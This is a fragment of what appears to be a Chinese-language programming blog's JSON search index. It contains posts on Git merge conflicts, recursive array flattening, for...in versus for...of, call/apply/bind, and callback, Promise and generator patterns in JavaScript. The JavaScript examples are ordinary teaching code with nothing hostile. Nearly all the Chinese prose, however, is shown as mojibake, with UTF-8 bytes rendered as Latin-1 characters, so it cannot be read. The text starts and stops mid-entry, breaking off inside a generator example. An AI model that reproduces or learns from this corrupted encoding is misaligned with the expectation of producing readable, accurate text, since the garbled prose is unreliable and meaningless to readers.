ä¸­æˆ‘å€‘å·²ç¶“ä»‹ç´¹éåˆ†æ”¯çš„è§€å¿µï¼Œä½†ä¹Ÿæœ‰æåˆ°ä¸€å€‹ã€ŒConflictï¼ˆè¡çªï¼‰ã€çš„æ¦‚å¿µï¼Œæ‰€ä»¥é€™ç¯‡æœƒè§£é‡‹ä¸€ä¸‹ä»€éº¼æ˜¯è¡çªï¼Ÿä»¥åŠå¦‚ä½•è§£æ±ºè¡çªï¼Ÿ è¡çªæ€éº¼ç™¼ç”Ÿçš„ï¼Ÿç°¡å–®ä¾†èªªï¼Œè¡çªæŒ‡çš„å°±æ˜¯ã€Œå…©å€‹äººéƒ½æ”¹åˆ°åŒä¸€å€‹æª”æ¡ˆçš„åŒä¸€å€‹åœ°æ–¹ã€ã€‚ èˆ‰å€‹ä¾‹å­ï¼š å‡è¨­æœ‰ Aã€B åˆ†æ”¯ï¼Œç¾åœ¨ PeaNu åœ¨åˆ†æ”¯ A æ”¹äº† DDDDD é€™å€‹æª”æ¡ˆçš„ç¬¬ 1 è¡Œï¼ŒPPB ä¹Ÿå‰›å¥½åœ¨åˆ†æ”¯ B æ”¹äº† DDDDD é€™å€‹æª”æ¡ˆçš„ç¬¬ 1 è¡Œã€‚ é‚£ç•¶è¦åˆä½µæ™‚ï¼Œä½ æŠŠè‡ªå·±æƒ³æˆæ˜¯ Gitï¼Œä½ è¦ºå¾—æ‡‰è©²è¦ç›¸ä¿¡ PeaNu é‚„æ˜¯ PPBï¼Ÿ å¾ˆç„¡è§£å§ï¼Ÿæ‰€ä»¥é€™ç¨®æ™‚å€™ Git æ²’è¾¦æ³•å¹«ä½ è‡ªå‹•è™•ç†ï¼Œå®ƒåªèƒ½ç„¡å¥ˆçš„è·Ÿä½ èªªï¼šã€ŒPeaNu åœ¨ DDDDD æª”æ¡ˆçš„ç¬¬ 1 è¡Œæ”¹äº†ä»€éº¼ï¼ŒPPB ä¹Ÿåœ¨ DDDDD æª”æ¡ˆçš„ç¬¬ 1 è¡Œæ”¹äº†ä»€éº¼ã€‚æˆ‘ä¸çŸ¥é“èª°çš„æ‰æ˜¯å°çš„ï¼Œæ‰€ä»¥ä½ å€‘è‡ªå·±è™•ç†ç§äººæ©æ€¨å›‰ã€‚ã€ é€™ç¨®æ™‚å€™å°±éœ€è¦äººå·¥ä¾†è™•ç†ï¼Œä¹Ÿå°±æ˜¯ä¿—ç¨±çš„ã€Œè§£ Conflictã€ã€‚ æ€éº¼è§£æ±ºè¡çªï¼Ÿæˆ‘å€‘ç”¨ä¸€å€‹ä¾‹å­ä¾†èªªæ˜å§ã€‚ å‡è¨­è·Ÿå‰›å‰›çš„ä¾‹å­ä¸€æ¨£ï¼Œä½†ç‚ºäº†æ–¹ä¾¿å€åˆ†ï¼Œé€™è£¡çš„å…©æ¢åˆ†æ”¯æ”¹æˆ PeaNu-branch è·Ÿ PPB-branchã€‚è€Œ PeaNu è·Ÿ PPB éƒ½åœ¨å„è‡ªçš„åˆ†æ”¯ä¸Šæ”¹äº† DDDDD æª”æ¡ˆçš„ç¬¬ä¸€è¡Œï¼š ï¼ˆé€™æ˜¯ PeaNu åšçš„ä¿®æ”¹ï¼‰ 1234èŠ±ç”Ÿé†¬å¥½åƒï¼AAAAABBBBBCCCCC ï¼ˆé€™æ˜¯ PPB åšçš„ä¿®æ”¹ï¼‰ 1234èŠ±ç”Ÿé†¬å™çˆ›ï¼AAAAABBBBBCCCCC æ¥ä¸‹ä¾†æˆ‘æƒ³è¦å¾ PeaNu-branch æŠŠ PPB-branch åˆ†æ”¯åˆä½µé€²ä¾†æ™‚ï¼Œå°±è·Ÿå‰é¢èªªçš„ä¸€æ¨£ï¼ŒGit å°±æœƒè·Ÿæˆ‘å“€è™Ÿï¼š 123UnMerged paths: (use \"git add &lt;file&gt;...\" to mark resolution) both modified: DDDDD.txt ï¼ˆæ„æ€å°±æ˜¯èªª PeaNu è·Ÿ PPB éƒ½æ”¹åˆ° DDDDD æª”æ¡ˆçš„åŒå€‹åœ°æ–¹ï¼Œæ‰€ä»¥ä½ å€‘è‡ªå·±æ±ºå®šè¦æ€éº¼è™•ç†ã€‚ï¼‰ æ‰€ä»¥é€™æ™‚å€™å°±è¦ä¾†ã€Œè§£ Conflictã€ã€‚æ‰“é–‹ DDDDD æª”æ¡ˆï¼Œä½ æœƒçœ‹åˆ°é€™æ¨£çš„å…§å®¹ï¼š 12345678&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADï¼ˆç›®å‰æ‰€åœ¨çš„åˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯ PeaNu-branchï¼‰èŠ±ç”Ÿé†¬å¥½åƒ=======èŠ±ç”Ÿé†¬å™çˆ›&gt;&gt;&gt;&gt;&gt;&gt;&gt; PPB-branchï¼ˆå¦ä¸€å€‹åˆ†æ”¯ï¼‰AAAAABBBBBCCCCC ï¼ˆ======= ä¹‹å‰çš„éƒ¨åˆ†ä»£è¡¨ PeaNu æ›´æ”¹çš„å…§å®¹ï¼Œ======= ä¹‹å¾Œçš„éƒ¨åˆ†ä»£è¡¨ PPB æ›´æ”¹çš„å…§å®¹ã€‚ï¼‰ é€™å€‹æ™‚å€™ä½ å°±è¦è‡ªå·±æ±ºå®šä½ æƒ³æ¡ç”¨èª°çš„å…§å®¹ã€‚ä½ å¯ä»¥é¸æ“‡ç•™ä¸‹ã€ŒèŠ±ç”Ÿé†¬å¥½åƒã€ï¼›ä¹Ÿå¯ä»¥é¸æ“‡ç•™ä¸‹ã€ŒèŠ±ç”Ÿé†¬å™çˆ›ã€ï¼›æˆ–ä½ ä¹Ÿå¯ä»¥é¸æ“‡ã€Œéƒ½ä¸è¦ç•™ä¸‹ã€ï¼›ç”šè‡³ä½ ä¹Ÿå¯ä»¥é¸æ“‡ã€Œå»ºç«‹å…¨æ–°çš„å…§å®¹ã€ï¼ˆä¾‹å¦‚ï¼šè‰è“é†¬è¬æ­²ï¼‰ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œæœ€å¾Œä½ æƒ³æ€éº¼é¸æ“‡éƒ½çœ‹ä½ è‡ªå·±ã€‚ç•¶ä½ æŠŠç™¼ç”Ÿè¡çªçš„åœ°æ–¹çµ¦è™•ç†å®Œç•¢å¾Œï¼Œæ¥ä¸‹ä¾†å°±å¯ä»¥ç¹¼çºŒç”¨ git commit -am ä¾†å®Œæˆé€™å€‹åˆä½µçš„å‹•ä½œã€‚ ç¸½çµæŒ‰ç…§æ…£ä¾‹æˆ‘å€‘ä¾†è¤‡ç¿’ä¸€ä¸‹ï¼š ç•¶å…©å€‹äººåœ¨ä¸åŒåˆ†æ”¯ä¸Šä¿®æ”¹åŒå€‹æª”æ¡ˆä¸­çš„ç›¸åŒéƒ¨åˆ†ï¼Œå°±æœƒå¼•ç™¼ Conflict è§£æ±º Confict çš„è¾¦æ³•ï¼Œæ˜¯è‡ªå·±æ±ºå®šè¦æ¡ç”¨ä»€éº¼æ¨£çš„å…§å®¹ è§£æ±ºç™¼ç”Ÿè¡çªçš„éƒ¨åˆ†å¾Œï¼Œå¿…é ˆåœ¨åŸ·è¡Œä¸€æ¬¡ git commit -am ä¾†å®Œæˆåˆä½µçš„å‹•ä½œ","link":"/2021/12/12/fix-the-conflict-of-git/"},{"title":"åˆ©ç”¨éè¿´ä¾†å›å£“å¹³é™£åˆ—","text":"è®“æˆ‘è±†é ç—›çš„éè¿´ã€‚ å¸¸çŠ¯çš„éŒ¯èª¤ä½¿ç”¨ join() èˆ‡ split()ã€‚ æˆ‘ä¸€é–‹å§‹æƒ³åˆ°çš„ä¹Ÿæ˜¯é€™ç¨®ä½œæ³•ï¼Œä½†å¾Œä¾†æ‰çŸ¥é“é€™ç¨®åšæ³•æœƒæœ‰å•é¡Œï¼š 123456function flatten(arr) { return arr.join(',').split(',')}console.log(flatten([1, 2, 3])) // ['1', '2', '3']console.log(flatten([1, 2, 3, [1, 2], [3, 4], 5])) // ['1', '2', '3', '1', '2', '3', '4', '5']console.log(flatten([1, 2, 3, [1, [2]], [3, 4, [5]], 6])) // ['1', '2', '3', '1', '2', '3', '4', '5', '6'] ï¼ˆæœ€å¾Œæœƒè®Šæˆå­—ä¸²æ˜¯å› ç‚º join æœƒå¼·åˆ¶æŠŠå…ƒç´ è½‰æˆå­—ä¸²ï¼‰ å…¶å¯¦é€™å€‹åšæ³•åœ¨å¤§éƒ¨åˆ†çš„æƒ…æ³ä¸‹éƒ½æ²’æœ‰å•é¡Œï¼Œå”¯ç¨åœ¨å…ƒç´ å‰›å¥½æ˜¯ ã€Œ,ã€ çš„æ™‚å€™æœƒå‡ºå•é¡Œã€‚ 1234function flatten(arr) { return arr.join(',').split(',')}console.log(flatten(['1,', 2, 3])) // ['1', '', '2', '3'] åŸå› æ˜¯å› ç‚ºï¼š join å¾Œæœƒè®Šæˆ =&gt; '1,,2,3' split å¾Œæœƒè®Šæˆ =&gt; ['1', '', '2', '3'] å¿˜è¨˜é€™å…©å€‹çš„ä½œç”¨å¯ä»¥åƒè€ƒ é™£åˆ—çš„å…§å»ºå‡½å¼ è·Ÿ è·Ÿå­—ä¸²æœ‰é—œçš„å…§å»ºå‡½å¼ æ‰€ä»¥é€™å€‹æ–¹æ³•å°æœƒå‡ºç¾é€—è™Ÿçš„ case éƒ½ç„¡æ³•ä½¿ç”¨ã€‚ æ­£ç¢ºçš„ä½œæ³•åˆ©ç”¨éè¿´çš„æ¦‚å¿µä¾†å¯¦ä½œï¼š 1234567891011121314151617181920212223function flatten(arr) { // å„²å­˜å£“å¹³å¾Œçš„é™£åˆ— const result = [] // éæ­·é™£åˆ—å…ƒç´  arr.forEach(item =&gt; { // å¦‚æœå…ƒç´ æ˜¯é™£åˆ—ï¼Œéè¿´é€™å€‹ function if(Array.isArray(item)) { // å‘¼å«è‡ªå·± const flattenArray = flatten(item) // æŠŠå£“å¹³å¾Œçš„é™£åˆ— push å›çµæœ flattenArray.forEach(item =&gt; result.push(item)) } else { result.push(item) } }) // å›å‚³çµæœ return result}console.log(flatten([1, 2, 3])) // [1, 2, 3]console.log(flatten([1, 2, 3, [1, 2], [3, 4], 5])) // [1, 2, 3, 1, 2, 3, 4, 5]console.log(flatten([1, 2, 3, [1, [2]], [3, 4, [5]], 6])) // [1, 2, 3, 1, 2, 3, 4, 5, 6]console.log(flatten(['1,', 2, 3])) // ['1,', 2, 3] é€™é¡Œçš„æ€è·¯æ˜¯é€™æ¨£å­ï¼š å»ºç«‹ä¸€å€‹ resultï¼Œç”¨ä¾†å„²å­˜å£“å¹³å¾Œçš„é™£åˆ— éæ­·å‚³å…¥çš„ arrï¼Œå¦‚æœå…ƒç´ ä¸æ˜¯é™£åˆ—ï¼Œç›´æ¥æ¨å…¥ result å¦‚æœæ˜¯é™£åˆ—ï¼Œå†æŠŠå®ƒå£“å¹³ é‡é»åœ¨æ–¼ç¬¬ä¸‰æ­¥çš„æ™‚å€™ï¼Œä½ æœƒæƒ³èªªã€Œé€™ä¸å°±æ˜¯æˆ‘æ­£è¦åšçš„äº‹æƒ…å—ï¼Ÿã€ï¼Œæ‰€ä»¥æœƒæ„Ÿåˆ°å¾ˆç–‘æƒ‘ã€‚ ä½†å…¶å¯¦ä¸ç”¨æƒ³çš„å¤ªè¤‡é›œï¼Œä½ åªè¦çŸ¥é“ flatten é€™å€‹ function æœ€å¾Œå°±æ˜¯æœƒå›å‚³ä¸€å€‹ã€Œå£“å¹³å¾Œçš„é™£åˆ—ã€ï¼Œæ‰€ä»¥ç›´æ¥çµ¦å®ƒå‘¼å«ä¸‹å»å°±å°äº†ã€‚ä¸ç®¡é€™å€‹éç¨‹æœƒé‡è¤‡å‘¼å«å¹¾æ¬¡ flattenï¼Œæœ€å¾Œéƒ½ä¸€å®šæœƒæœ‰ç›¡é ­ï¼ˆç•¶å…ƒç´ ä¸å†æ˜¯é™£åˆ—çš„æ™‚å€™ï¼Œå°±æœƒè¢«æ¨åˆ° resultï¼‰ã€‚","link":"/2022/01/02/flatten-array/"},{"title":"for è¿´åœˆçš„å»¶ä¼¸ for...in èˆ‡ for...of","text":"å­¸èµ·ä¾†å­¸èµ·ä¾†ã€‚ æ‡¶äººåŒ… for...in æœƒè¼¸å‡º keyï¼Œé€šå¸¸ç”¨åœ¨ objectï¼ˆES5ï¼‰ for...of æœƒè¼¸å‡º value åªèƒ½ç”¨åœ¨ arrayï¼ˆES6ï¼‰ å…©è€…çš„å·®ç•°12345678910const arr = [1, 2, 3, 4, 5, 6]// for...infor(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', '5'}// for..offor(let value of arr) { console.log(value) // 1, 2, 3, 4, 5, 6} forâ€¦in çš„å¹¾å€‹ç‰¹é» æœƒè¼¸å‡ºåœ¨é™£åˆ—ä¸­æ–°å¢çš„ key 123456789101112const arr = [1, 2, 3, 4, 5]// å° arr å»ºç«‹æ–°çš„ keyarr.myKey = 'hello'for(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', 'myKey'}for(let value of arr) { console.log(value) // 1, 2, 3, 4, 5} for...of æœƒæŒ‰ç…§ arr[0], arr[1]... é€™æ¨£çš„é †åºå»è¿­ä»£ï¼Œæ‰€ä»¥ä¸æœƒè¿­ä»£åˆ° arr['myKey'] é€™å€‹å€¼ï¼Œä¹Ÿå°±æ²’è¾¦æ³•è¼¸å‡º 'hello' äº†ã€‚ æœƒè¼¸å‡ºå¾åŸå‹éˆä¸­ç¹¼æ‰¿çš„å±¬æ€§ 123456789101112const arr = [1, 2, 3, 4, 5]// åœ¨ Array çš„ prototype ä¸­æ–°å¢å±¬æ€§Array.prototype.myProperty = 'hello'for(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', 'hello'}for(let value of arr) { console.log(value) // 1, 2, 3, 4, 5} é€™è£¡è«‡çš„ prototype æ˜¯æŒ‡æˆ‘å€‘è‡ªå·±é¡å¤–æ–°å¢çš„æ‰ç®—æ•¸ï¼Œä¸åŒ…å«åŸæœ¬å…§å»ºçš„ã€‚ 123456789101112const arr = [1, 2, 3, 4, 5]// åœ¨ Object çš„ prototype ä¸­æ–°å¢å±¬æ€§Object.prototype.myProperty = 'hello'for(let key in arr) { console.log(key) // '0', '1', '2', '3', '4', 'hello'}for(let value of arr) { console.log(value) // 1, 2, 3, 4, 5} æ—¢ç„¶æ˜¯åŸå‹éˆï¼Œé‚£åªè¦èƒ½å¤ åœ¨åŸå‹éˆä¸­çš„ prototype æ‰¾åˆ°çš„å±¬æ€§éƒ½èƒ½ç®—æ•¸ã€‚ä¸éç¯„åœè·Ÿå‰›æ‰ä¸€æ¨£ï¼Œåƒ…é™æ–¼æˆ‘å€‘å¦å¤–æ–°å¢çš„æ‰ç®—æ•¸ã€‚ forâ€¦of ä¸¦ä¸èƒ½è¿­ä»£ç‰©ä»¶çš„å€¼å‰é¢æœ‰æåˆ° for...of æ˜¯æŒ‰ç…§ arr[0], arr[1]... é€™æ¨£çš„é †åºä¾†è¿­ä»£å‡º valueã€‚æ‰€ä»¥ç•¶ for..of çš„å°è±¡æ˜¯ç‰©ä»¶ï¼ˆObjectï¼‰çš„è©±ï¼Œæœƒæ‹‹å‡ºä¸€å€‹éŒ¯èª¤è·Ÿä½ èªªï¼šã€Œé€™æ˜¯ä¸€å€‹æ²’è¾¦æ³•è¿­ä»£çš„å°è±¡ã€ 12345678910const me = { name: 'Jim', age: 20, position: 'engineer'}// Uncaught TypeError: me is not iterablefor(let value of me) { console.log(value)} é›–ç„¶ for..of æœ¬èº«ç„¡æ³•åšåˆ°ï¼Œä½†å¯ä»¥æ­é… Object.keys() ä¾†å–å‡ºç‰©ä»¶ä¸­çš„å€¼ã€‚ 12345678910const me = { name: 'Jim', age: 20, position: 'engineer'}// Object.keys æœƒå›å‚³ä¸€å€‹åŒ…å«æ‰€æœ‰ key çš„é™£åˆ—for(let value of Object.keys(me)) { console.log(me[value])} é€™è£¡çš„å°å·§æ€å°±æ˜¯ï¼Œfor...of çš„å°è±¡ä»ç„¶æ˜¯é™£åˆ—ï¼ˆArrayï¼‰ï¼Œä½†é€™å€‹é™£åˆ—åŒ…å«äº†æ‰€æœ‰æˆ‘å€‘éœ€è¦çš„ key å€¼ï¼Œåˆ©ç”¨å®ƒå°±èƒ½å–å‡ºç‰©ä»¶ä¸­çš„æ¯å€‹å€¼ã€‚","link":"/2022/01/07/for-in-and-for-of/"},{"title":"function ä¸­çš„ call apply bind","text":"è©²ä¾†çš„é‚„æ˜¯å¾—ä¾†ã€‚ ç°¡è¿°å‘¼å« function æœ‰ä¸‰ç¨®æ–¹æ³•ï¼š ç”¨æ‹¬è™Ÿ () ç”¨ call ç”¨ apply () å°±æ˜¯ä½ å¸¸ç”¨çš„ï¼Œæ‰€ä»¥ä¸å¤šåšä»‹ç´¹ï¼Œåªæœƒä»‹ç´¹ call è·Ÿ apply é€™å…©å€‹ã€‚ å¦å¤– bind ä¸æ˜¯ç”¨ä¾†å‘¼å« functionï¼Œæ˜¯ç”¨ä¾†ç¶å®š this å€¼çš„ä¸€ç¨® methodï¼Œä¸¦å›å‚³ä¸€å€‹æ–°çš„ functionã€‚ è·Ÿ this å€¼æœ‰é—œçš„ä¸€äº›æ‡¶äººåŒ…ï¼š åš´æ ¼æ¨¡å¼ä¸‹ï¼Œä¸æ˜¯åœ¨ç‰©ä»¶è£¡çš„ this å€¼éƒ½æ˜¯ undefined éåš´æ ¼æ¨¡å¼ä¸‹ï¼Œä¸æ˜¯åœ¨ç‰©ä»¶è£¡çš„ this å€¼æ˜¯ window / globalï¼ˆç€è¦½å™¨ / Node.jsï¼‰ éåš´æ ¼æ¨¡å¼ä¸‹ï¼Œç”¨ call apply bind å‚³å…¥çš„ primitive éƒ½æœƒè¢«è½‰æˆ object å¦‚æœå‚³ null undefinedï¼Œéåš´æ ¼æ¨¡å¼ä¸€å¾‹ç­‰æ–¼ window / globalï¼Œåš´æ ¼ç­‰æ–¼ null undefined call çš„ç”¨æ³•1234function hello(a, b) { console.log(a + b)}hello.call(null, 5, 10); // 15 ç¬¬ä¸€å€‹å€¼æ˜¯è¨­å®š this å€¼ï¼Œå¾…æœƒå†è¨è«–ï¼Œç¬¬äºŒå€‹åƒæ•¸å°±æ˜¯ function ä¸­çš„åƒæ•¸äº†ã€‚ this å€¼è¦æ³¨æ„æ˜¯ä¸æ˜¯ã€Œåš´æ ¼æ¨¡å¼ã€ï¼š åœ¨åš´æ ¼ä¸‹ï¼Œå‚³ä»€éº¼å°±æ˜¯ä»€éº¼ï¼Œå‚³ null, undefined å°±æœƒå¾—åˆ° null, undefined åœ¨éåš´æ ¼ä¸‹ï¼Œå‚³é€²å» null undefined æœƒå¾—åˆ° global / windowï¼Œè€Œ primitive éƒ½æœƒè®Šæˆ Objectã€‚ 123456789'use strict';function hello(a, b) { console.log(this, a + b) }hello.call(null, 5, 10); // null, 15hello.call(undefined, 5, 10); // undefined, 15hello.call('yoyoyo', 5, 10); // yoyoyo, 15hello.call(1010, 5, 10); // 1010, 15 1234567function hello(a, b) { console.log(this, a + b) }hello.call(null, 5, 10); // window / global, 15hello.call(undefined, 5, 10); // window / global, 15hello.call('yoyoyo', 5, 10); // {String: yoyoyo}, 15hello.call(1010, 5, 10); // {Number: 1010}, 15 apply çš„ç”¨æ³•å…¶å¯¦å°±è·Ÿ call ä¸€æ¨¡ä¸€æ¨£ï¼Œå·®åˆ¥åœ¨æ–¼åƒæ•¸æ˜¯ç”¨ Array ä¾†å‚³å…¥ï¼š 1234function hello(a, b) { console.log(a + b) }hello.apply(null, [10, 5]) // 15 ä¸€æ¨£å¯ä»¥æ”¹ this å€¼ï¼Œæ³¨æ„ä¸€ä¸‹åš´æ ¼èˆ‡éåš´æ ¼å°±å¥½ï¼š 123456789'use strict';function hello(a, b) { console.log(this, a + b) }hello.apply(null, [10, 5]) // null, 15hello.apply(undefined, [10, 5]) // undefined, 15hello.apply('yoyoyo', [10, 5]) // yoyoyo, 15hello.apply(1010, [10, 5]) // 1010, 15 1234567function hello(a, b) { console.log(this, a + b) }hello.apply(null, [10, 5]) // window / global , 15hello.apply(undefined, [10, 5]) // window / global, 15hello.apply('yoyoyo', [10, 5]) // {String: yoyoyo}, 15hello.apply(1010, [10, 5]) // {Number: 1010}, 15 bind çš„ç”¨æ³•å‰é¢æœ‰èªªéå®ƒæ˜¯ç”¨ä¾†ç¶å®š this å€¼çš„ methodï¼Œå› ç‚ºæ˜¯ã€Œç¶å®šã€ï¼Œæ‰€ä»¥ä½ å°±ç®—ä¹‹å¾Œå†ç”¨ call æˆ– apply ä¹Ÿä¸æœƒæ”¹è®Šã€‚ å‚™è¨»ï¼šç”¨ bind æœƒå›å‚³ä¸€å€‹æ–°çš„ functionï¼ˆç¶å®šå¥½ this å€¼å†å›å‚³ï¼‰ 123456789'use strict'function hello() { console.log(this)}hello() // undefinedlet newFunction = hello.bind('yo')newFunction() // yo 1234567function hello() { console.log(this)}hello() // window / globallet newFunction = hello.bind('yo') newFunction() // {String: yo} ç¸½ä¹‹å‘¢ï¼Œä½ å‚³å…¥çš„ this å€¼æœƒæ ¹æ“šåš´æ ¼æˆ–éåš´æ ¼æ¨¡å¼å®šç¾©ï¼Œå¿˜è¨˜çš„è©±å°±å›å»è¤‡ç¿’ä¸Šé¢çš„ä¾‹å­ã€‚","link":"/2022/02/01/function-call-apply-bind/"},{"title":"å‡½å¼çš„å®£å‘Šæ–¹å¼","text":"å¦‚é¡Œã€‚ é™¤äº†é€™ç¨®æ–¹å¼ä»¥å¤–ï¼š 123function hello() { console.log('hello')} ä¹Ÿå¯ä»¥é€™æ¨£å®£å‘Šï¼š 123var hello = function() { console.log('hello')} é‚„è¨˜å¾— function å…¶å¯¦ä¹Ÿæ˜¯ä¸€ç¨®ã€Œè³‡æ–™å‹æ…‹ã€å—ï¼Ÿæ‰€ä»¥æŠŠå®ƒå„²å­˜åˆ°ä¸€å€‹è®Šæ•¸è£¡é¢ä¹Ÿæ˜¯å¾ˆåˆç†çš„äº‹æƒ…ï¼Œå°å§ï¼Ÿ","link":"/2021/12/18/function-define-method/"},{"title":"å‡½å¼å¡«ç©ºæ³•","text":"ç¶“å…¸çš„ä½œæ³•ã€‚ æŠŠå¤§äº‹æƒ…æ‹†æˆå°äº‹æƒ…å¦‚æœä½ ä¸çŸ¥é“æŸäº›æ±è¥¿çš„ç´°ç¯€è©²æ€éº¼å¯¦ä½œï¼Œä¸€å€‹æœ€ç›´è¦ºçš„æ–¹å¼å°±æ˜¯ã€Œå…ˆå¯« function ä¾†å¡«ç©ºã€ã€‚ ä¾‹å¦‚èªªé¡Œç›®æ˜¯ï¼šå°å‡º 1 ~ 100 ä¸­çš„å¥‡æ•¸ã€‚ å¦‚æœæ²’è¾¦æ³•ç›´æ¥æƒ³å‡ºæ¯ä¸€æ­¥è¦æ€éº¼å¯«ï¼Œé‚£ä½ å¯ä»¥å…ˆæŠŠäº‹æƒ…å¤§äº‹æƒ…æ‹†æˆå°äº‹æƒ…ï¼š å°å‡º 1 ~ 100 æŠŠæ˜¯å¥‡æ•¸çš„æ•¸çµ¦ log å‡ºä¾† æ‰€ä»¥é€™é‚Šå°±å¯ä»¥ç”¨å…©å€‹ function ä¾†å¡«ç©ºï¼š print1to100() logOdd() æ¥ä¸‹ä¾†å°±ä¸€æ­¥ä¸€æ­¥å¯¦ä½œï¼š 12345function print1to100 () { for(var i=1; i&lt;=100; i++) { console.log(i) }} 1 ~ 100 çš„éƒ¨åˆ†æ²’å•é¡Œäº†ï¼Œæ¥è‘—è¦ä¾†è™•ç†å¥‡æ•¸çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥å¯ä»¥æŠŠ console.log(i) é€™å€‹éƒ¨åˆ†æ”¹ç”¨å¦å¤–ä¸€å€‹ function å¡«é€²ä¾†ï¼š 12345function print1to100 () { for(var i=1; i&lt;=100; i++) { logOdd(i) }} æ—¢ç„¶é››å½¢å·²ç¶“æœ‰äº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯å‹•è…¦å¯¦ä½œå›‰ï¼š 12345function logOdd(number) { if (number &amp; 1) { console.log(number) }} TAï½DAï¼é€™æ¨£å°±åšå®Œå›‰ã€‚ é¡Œå¤–è©±å…¶å¯¦é€™æ˜¯å€‹è »å¯¦ç”¨çš„åšæ³•çš„ï¼Œä½†æˆ‘æœ‰æ™‚å€™æœƒå¿˜è¨˜é€™å€‹æ–¹å¼ï¼Œæ‰€ä»¥æƒ³å¯«ä¸‹ä¾†æé†’è‡ªå·±ã€‚","link":"/2021/12/18/function-fill-method/"},{"title":"function çš„å›å‚³å€¼","text":"ç°¡çŸ­ç´€éŒ„ä¸€ä¸‹ã€‚ function çš„é è¨­å›å‚³å€¼å¦‚æœä¸€å€‹ function è£¡é¢æ²’æœ‰ç”¨ return ä¾†å›å‚³ä¸€å€‹å€¼ï¼Œé‚£é è¨­å°±æœƒå›å‚³ undefinedã€‚ å¤§å¤šæ•¸çš„æƒ…æ³éƒ½æœƒè®“ function æœ‰ä¸€å€‹å›å‚³å€¼ï¼Œé€™æ¨£æ˜¯æ¯”è¼ƒæ­£ç¢ºçš„åšæ³•ï¼Œè«‹ä¿æŒé€™å€‹è‰¯å¥½çš„ç¿’æ…£ã€‚ æ²’æœ‰å›å‚³å€¼çš„ç¯„ä¾‹1234function sayHello() { console.log('hello')}console.log(sayHello()) çµæœï¼š 12'hello'undefined æœ‰å›å‚³å€¼çš„ç¯„ä¾‹1234function sayHello() { return 'hello'}console.log(sayHello()) çµæœï¼š 1'hello'","link":"/2021/12/20/function-return-value/"},{"title":"å¾ Callback åˆ° Promise å†åˆ° Generator","text":"å¾ˆæœ‰æ„æ€çš„å¯«æ³•ã€‚ ç°¡è¿°é€™ç¯‡æ˜¯ç¹¼ å¿«é€Ÿå…¥é–€ generator çš„å»¶ä¼¸æ–‡ç« ï¼Œä¸»è¦æ˜¯æƒ³ä»‹ç´¹ä¸€ä¸‹ç”¨ generator ä¾†å¯¦ç¾éåŒæ­¥æ“ä½œæ˜¯æ€éº¼æ¨£çš„æ„Ÿè¦ºã€‚ ç¯„ä¾‹é€™é‚Šæˆ‘å€‘å…ˆå¾ callback é–‹å§‹ï¼Œæˆ‘å€‘è¦åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œå°±æ˜¯æ¨¡æ“¬æ‰“ä¸‰éš» APIï¼Œåˆ†åˆ¥æ˜¯ä»¥ä¸‹å¹¾å€‹ 1. æ–‡ç« åˆ—è¡¨ 1234567891011121314const posts = [ { postId: 1, title: 'post1', }, { postid: 2, title: 'post2' }, { postid: 3, title: 'post3' }] 2. æ–‡ç« è³‡è¨Š 1234567891011121314151617const postInfo = [ { authorId: 1, content: 'content', createdAt: '2022-05-06' }, { authorId: 2, content: 'content', createdAt: '2022-05-07' }, { authorId: 3, content: 'content', createdAt: '2022-05-08' }] 3. ä½œè€…è³‡è¨Š 1234567891011121314151617const authors = [ { id: 1, name: \"PeaNu\", email: \"jimdevelopesite@gmail.com\", }, { id: 2, name: \"Garry\", email: \"garrylovecook@gmail.com\", }, { id: 3, name: \"PPB\", email: \"ppbissuperman@gmail.com\", }] é †åºçš„è©±å°±æ˜¯ï¼š å¾æ–‡ç« åˆ—è¡¨ä¸­å–å¾—æ–‡ç«  idï¼Œå†ç”¨ id æŸ¥æ–‡ç« è³‡è¨Š å¾æ–‡ç« è³‡è¨Šä¸­å–å¾—ä½œè€… idï¼Œå†ç”¨ id æŸ¥ä½œè€… æ‹¿åˆ°ä½œè€…çš„åå­— æ‰€ä»¥ç­‰ä¸€ä¸‹æœƒå¾ callback ä»‹ç´¹åˆ° Promiseï¼Œå†ä»‹ç´¹åˆ° generator ä¸‰ç¨®ä¸åŒçš„æ–¹å¼ã€‚ é †é“ä¸€æï¼Œå› ç‚ºæ˜¯å‡è³‡æ–™ï¼Œæ‰€ä»¥æœƒç”¨ setTimeout ä¾†æ¨¡æ“¬éåŒæ­¥ã€‚ callback12345678910111213141516171819function getPosts (callback) { setTimeout(() =&gt; callback(posts), 1000)}function getPostInfo (id, callback) { setTimeout(() =&gt; callback(postInfo.find(item =&gt; item.authorId === id)), 1000)}function getAuthor (id, callback) { setTimeout(() =&gt; callback(authors.find(item =&gt; item.id === id)), 1000)}getPosts(posts =&gt; { getPostInfo(posts[0].postId, post =&gt; { getAuthor(post.authorId, author =&gt; { console.log(author.name); }) })}) ä¿—ç¨±çš„ callback hellï¼Œä¸é JS å¯«ä¹…ä»¥å¾Œå°±æœƒè¦ºå¾—é€æ¼¸éº»ç—ºäº†ï¼Œé›–ç„¶çœŸçš„è »é†œçš„ã€‚ Promise12345678910111213141516171819202122function getPosts () { return new Promise(resolve =&gt; { setTimeout(() =&gt; resolve(posts), 1000) })}function getPostInfo (id) { return new Promise(resolve =&gt; { setTimeout(() =&gt; resolve(postInfo.find(item =&gt; item.authorId === id)), 1000) })}function getAuthor (id) { return new Promise(resolve =&gt; { setTimeout(() =&gt; resolve(authors.find(item =&gt; item.id === id)), 1000) })}getPosts().then(posts =&gt; getPostInfo(posts[0].postId)).then(post =&gt; getAuthor(post.authorId)).then(author =&gt; console.log(author.name)) æ”¹ç”¨ return Promise çš„æ–¹å¼ä¾†åŒ…è£ï¼Œæ¥è‘—å°±å¯ä»¥ç”¨ then ä¾†è™•ç†ï¼Œé¿å…äº† callback hell çš„å•é¡Œã€‚ generatoræ¥è‘—æ˜¯é‡é ­æˆ²äº†ï¼Œå…ˆä¾†çœ‹ codeï¼š 1234567891011121314151617// ä¸Šé¢ç¶­æŒå‰›å‰›çš„ Promiseï¼Œæ‰€ä»¥å°±ä¸å¯«å‡ºä¾†äº†function* getResult () { const posts = yield getPosts(); const post = yield getPostInfo(posts[0].postId); const author = yield 